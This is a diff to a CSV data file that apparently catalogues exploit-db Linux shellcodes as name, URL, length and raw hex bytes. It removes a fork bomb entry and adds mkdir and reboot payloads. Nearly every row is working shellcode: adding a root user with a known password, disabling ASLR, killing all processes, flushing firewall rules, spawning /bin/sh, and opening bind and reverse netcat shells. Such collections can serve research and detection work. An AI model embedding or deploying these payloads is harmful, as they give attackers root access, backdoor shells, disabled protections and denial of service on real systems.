@@ -50,7 +50,6 @@ Kill All Processes Shellcode,https://www.exploit-db.com/shellcodes/46492,11,6a3e
 Disable ASLR Security Shellcode,https://www.exploit-db.com/shellcodes/46007,93,6a3b589948bb2f62696e2f736800534889e7682d6300004889e652e8360000006563686f2030207c207375646f20746565202f70726f632f7379732f6b65726e656c2f72616e646f6d697a655f76615f73706163650056574889e60f05
 Add Root User (toor/toor) Shellcode,https://www.exploit-db.com/shellcodes/45185,99,31dbf7e350bbff737764c1eb085348bb2f6574632f706173534889e787f266be010404020f054897eb0e5e6a01586a265a0f056a3c580f05e8edffffff746f6f723a735875434b69376b3358682f733a303a303a3a2f726f6f743a2f62696e2f73680a
 mkdir(evil) Shellcode,https://www.exploit-db.com/shellcodes/42791,30,eb134831c05f66beef0104530f054831c0043c0f05e8e8ffffff6576696c
-Fork Bomb Shellcode,https://www.exploit-db.com/shellcodes/42523,11,4831c04883c0390f05ebf5
 Kill All Processes Shellcode,https://www.exploit-db.com/shellcodes/42522,19,4831c06aff5f4883c0094889c64883c0350f05
 execve(/bin/sh) Shellcode,https://www.exploit-db.com/shellcodes/42179,24,504831d24831f648bb2f62696e2f2f736853545fb03b0f05
 execve(/bin/sh) Shellcode,https://www.exploit-db.com/shellcodes/42126,31,eb104831c05f4831f64831d24883c03b0f05e8ebffffff2f62696e2f2f7368
@@ -59,3 +58,5 @@ Reverse Netcat Shell (127.0.0.1:1337) Shellcode,https://www.exploit-db.com/shell
 setuid(0) + execve(/bin/sh) + Polymorphic Shellcode,https://www.exploit-db.com/shellcodes/41498,31,31ff68000000006869005048b85ec42dcd5e6e65d0504889e7b83b0000005253504889e6994831c0504889e70f05
 Flush IPTables Rules (/sbin/iptables -F) + Polymorphic Shellcode,https://www.exploit-db.com/shellcodes/41503,47,68520000004831d252682d46000050534889e348c1e0012c0f48c1e12f2f7362696e2f2f68505f525351504889e60f05
 Bind (Random TCP Port) Shell (/bin/sh) Shellcode,https://www.exploit-db.com/shellcodes/41468,54,68290000004831c05268020000005068010000004831d20f0531ff4889c7500f05b02b0f0552534889e74831c05048bb2f2f736800000000534889e64883c410b03b0f05
+mkdir(ajit) Shellcode,https://www.exploit-db.com/shellcodes/41089,25,4831f65668616a6974545f6a535866beef010f056a3c580f05
+execve(/bin/sh -c reboot) Shellcode,https://www.exploit-db.com/shellcodes/40808,89,eb305e31c088460788460a8846118976128d5e08895e168d5e0b895e1a89461eb00b89f38d4e128d561ecd80b00131dbcd80e8cbffffff2f62696e2f7368232d63237265626f6f742341414141424242424343434344444444
